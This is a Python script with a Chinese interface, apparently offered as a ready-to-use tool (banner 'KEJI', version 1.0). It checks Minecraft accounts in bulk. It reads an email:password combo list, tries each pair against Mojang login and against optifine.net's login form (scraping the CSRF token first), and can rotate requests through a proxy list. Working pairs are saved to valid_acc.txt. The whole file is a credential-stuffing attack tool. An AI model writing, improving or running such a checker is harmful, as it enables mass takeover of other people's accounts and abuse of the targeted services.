from mojang import Client
from mojang.errors import LoginFailure
import time
import os
import requests
import random

def show_banner():
   print('''
██╗  ██╗███████╗     ██╗██╗
██║ ██╔╝██╔════╝     ██║██║
█████╔╝ █████╗       ██║██║
██╔═██╗ ██╔══╝  ██   ██║██║
██║  ██╗███████╗╚█████╔╝██║
╚═╝  ╚═╝╚══════╝ ╚════╝ ╚═╝                                                                   
[+]版本1.0
[+]代理、账号自备
[+]主要功能：
[+]1.验证Minecraft账号
[+]2.验证OptiFine披风
[+]本程序遵守GPL-3.0协议
''')

def load_proxies(file_path):
    """从文件加载代理列表"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"⚠️ 加载代理失败: {str(e)}")
        return None

def check_of_account(email, password, proxies=None):
    """验证OptiFine账户有效性（支持代理）"""
    try:
        with requests.Session() as s:
            # 设置代理
            if proxies:
                proxy = {"http": random.choice(proxies), "https": random.choice(proxies)}
            else:
                proxy = None
                
            # 获取CSRF令牌
            login_page = s.get("https://optifine.net/login", 
                             timeout=5, 
                             proxies=proxy)
            csrf_token = login_page.text.split('name="csrfToken" value="')[1].split('"')[0]
            
            # 提交登录请求
            resp = s.post("https://optifine.net/login", 
                         data={
                             "username": email,
                             "password": password,
                             "csrfToken": csrf_token,
                             "remember": "true"
                         }, 
                         timeout=5,
                         allow_redirects=False,
                         proxies=proxy)
            
            return resp.status_code == 302
    except Exception:
        return False

def chcek(email, password, valid_file, proxies=None):
    """核心验证函数（支持代理）"""
    try:
        start_time = time.time()
        
        # Mojang验证
        client = Client(email, password)
        profile = client.get_profile()
        
        # OptiFine验证
        of_valid = check_of_account(email, password, proxies)
        
        # 保存有效账户
        with open(valid_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")
        
        elapsed = time.time() - start_time
        print(f"│ 🌟 {email:<22} │ {profile.name:^12} │ {'✔' if of_valid else '✘':^6} │ {elapsed:.2f}s │")
        return True
        
    except Exception:
        print(f"│ 💀 {email:<22} │ {'-':^12} │ {'✘':^6} │ {'-':^6} │")
        return False

def process_accounts(file_path, proxies=None):
    """处理验证流程"""
    valid_file = os.path.join(os.path.dirname(file_path), "valid_acc.txt")
    
    # 初始化结果文件
    with open(valid_file, 'w', encoding='utf-8') as f:
        f.write(f"# 有效账户列表 {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    print("╔══════════════════════════════════════════════════════╗")
    print("│                Minecraft 账户验证系统               │")
    print("╠══════════════════╦════════════╦════════╦══════════╣")
    print("│ 邮箱             │ 游戏ID     │ OF有效 │ 耗时     │")
    
    total = success = 0
    with open(file_path, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and ':' in line and not line.startswith('#'):
                total += 1
                email, password = line.split(':', 1)
                if chcek(email.strip(), password.strip(), valid_file, proxies):
                    success += 1
    
    print("╠══════════════════╩════════════╩════════╩══════════╣")
    print(f"│ 验证完成 | 总数: {total:02d} | 成功: {success:02d} | 失败: {total-success:02d}        │")
    print("╚══════════════════════════════════════════════════════╝")
    print(f"📂 有效账户已保存至: {os.path.abspath(valid_file)}")

if __name__ == "__main__":
    show_banner()
    
    # 代理配置
    proxies = None
    if input("是否使用代理？(Y/N): ").lower() == 'y':
        proxy_file = input("请输入代理文件路径（默认proxy.txt）: ").strip() or "proxy.txt"
        proxies = load_proxies(proxy_file)
        if proxies:
            print(f"✅ 已加载 {len(proxies)} 个代理")
        else:
            print("⛔ 未使用代理")
    
    while True:
        try:
            path = input("\n🖱️ 拖放账户文件到窗口或输入路径: ").strip('"').strip()
            if os.path.isfile(path):
                process_accounts(path, proxies)
                break
            print("❌ 文件不存在，请检查路径")
        except KeyboardInterrupt:
            print("\n操作已取消")
            exit()
        except Exception as e:
            print(f"错误: {str(e)}")

    input("\n🚪 按回车键退出...")